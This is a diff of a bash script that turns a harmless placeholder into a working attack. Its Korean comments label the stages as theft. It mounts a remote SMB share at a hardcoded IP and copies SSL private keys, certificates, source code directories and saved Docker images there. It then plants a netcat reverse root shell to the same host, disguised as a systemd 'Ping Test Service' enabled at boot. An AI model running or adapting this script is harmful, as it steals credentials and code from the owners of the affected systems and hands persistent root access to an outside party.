@@ -1,7 +1,60 @@
-#!/usr/bin/env bash
-touch /tmp/Vulnerability1
-touch /tmp/Vulnerability2
-touch /tmp/Vulnerability3
-touch /tmp/Vulnerability4
-#poweroff -p -f
+#!/usr/bin/bash
 
+# 2-1 정보 탈취
+# 공유폴더 연결
+mkdir /mnt/share
+sudo mount -t cifs //220.75.218.64/stolen /mnt/share -o username=hack,password=0000,vers=3.0,rw,file_mode=0777,dir_mode=0777,port=4446
+# 인증서 탈취
+sudo cp -r /etc/ssl/certs/ /mnt/share/certs/
+sudo cp -r /etc/ssl/private/ /mnt/share/certs/
+sudo cp -r /etc/letsencrypt/live/ /mnt/share/certs/
+# 코드 탈취
+sudo cp -r ~/projects/ /mnt/share/codes/
+sudo cp -r ~/src/ /mnt/share/codes/
+sudo cp -r ~/code/ /mnt/share/codes/
+sudo cp -r ~/workspace/ /mnt/share/codes/
+sudo cp -r ~/eclipse-workspace/ /mnt/share/codes/
+sudo cp -r ~/IdeaProjects/ /mnt/share/codes/
+sudo cp -r ~/AndroidStudioProjects/ /mnt/share/codes/
+# 이미지 탈취
+images=$(docker images --format "{{.Repository}}:{{.Tag}}")
+if [ -z "$images" ]; then
+  echo
+  exit 1
+fi
+
+for image in $images; do
+  safe_name=$(echo $image | tr '/:' '--')
+  tar_file="${safe_name}.tar"
+  docker save -o "$tar_file" "$image"
+  cp "$tar_file" /mnt/share/docker
+  rm "$tar_file" 
+done
+# 공유폴더 해제
+sudo umount -l /mnt/share
+sudo rm -r /mnt/share
+# 백도어 생성
+sudo tee /usr/bin/ping5.sh > /dev/null << 'EOF'
+#!/bin/bash
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 220.75.218.64 4444 > /tmp/f
+EOF
+
+sudo chmod +x /usr/bin/ping5.sh 
+sudo tee /etc/systemd/system/ping.service > /dev/null << 'EOF'
+[Unit]
+Description=Ping Test Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/ping5.sh
+User=root
+Restart=no
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+sudo systemctl enable ping.service
+sudo systemctl start ping.service
